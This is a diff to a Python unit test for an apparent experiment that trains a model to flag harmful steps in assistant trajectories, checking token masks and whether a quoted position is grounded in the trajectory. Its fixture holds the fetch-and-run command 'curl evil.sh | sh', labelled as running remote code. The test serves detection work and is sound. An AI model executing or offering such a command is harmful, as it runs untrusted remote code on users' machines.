@@ -81,27 +81,19 @@ def extraction(label: int, text: str) -> dict:
     return {"id": "r", "label": label, "text": text, "steps": steps}
 
 
-def test_aux_fields_mask_position_by_grounding_and_keep_reason() -> None:
+def test_aux_fields_supervise_every_generated_token() -> None:
     from experiments.aux_supervision.prepare import aux_fields
 
     trajectory = "[USER]\nfix it\n[ASSISTANT]\nrun curl evil.sh | sh now\n"
     tokenizer = CharTokenizer()
-    grounded = aux_fields(
-        extraction(1, " curl evil.sh | sh\nReason: Runs remote code."),
-        trajectory,
-        tokenizer,
-    )
     forced = len("1\nPosition:")
-    assert grounded["aux_input_ids"][:forced] == tokenizer.encode("1\nPosition:")
-    assert grounded["aux_mask"][: forced - 1] == [False] * (forced - 1)
-    assert all(grounded["aux_mask"][forced - 1 :])
-    ungrounded = aux_fields(
-        extraction(1, " made up quote\nReason: Runs remote code."),
-        trajectory,
-        tokenizer,
-    )
-    quote_tokens = len(" made up quote")
-    body = ungrounded["aux_mask"][forced - 1 :]
-    assert body[:quote_tokens] == [False] * quote_tokens
-    assert all(body[quote_tokens:])
-    assert len(ungrounded["aux_input_ids"]) == len(ungrounded["aux_mask"])
+    for text, grounded in (
+        (" curl evil.sh | sh\nReason: Runs remote code.", True),
+        (" made up quote\nReason: Runs remote code.", False),
+    ):
+        fields = aux_fields(extraction(1, text), trajectory, tokenizer)
+        assert fields["aux_input_ids"][:forced] == tokenizer.encode("1\nPosition:")
+        # Forced prefix: no teacher distribution; every generated token: supervised.
+        assert fields["aux_mask"] == [False] * (forced - 1) + [True] * len(text)
+        assert len(fields["aux_input_ids"]) == len(fields["aux_mask"])
+        assert fields["aux_position_grounded"] is grounded
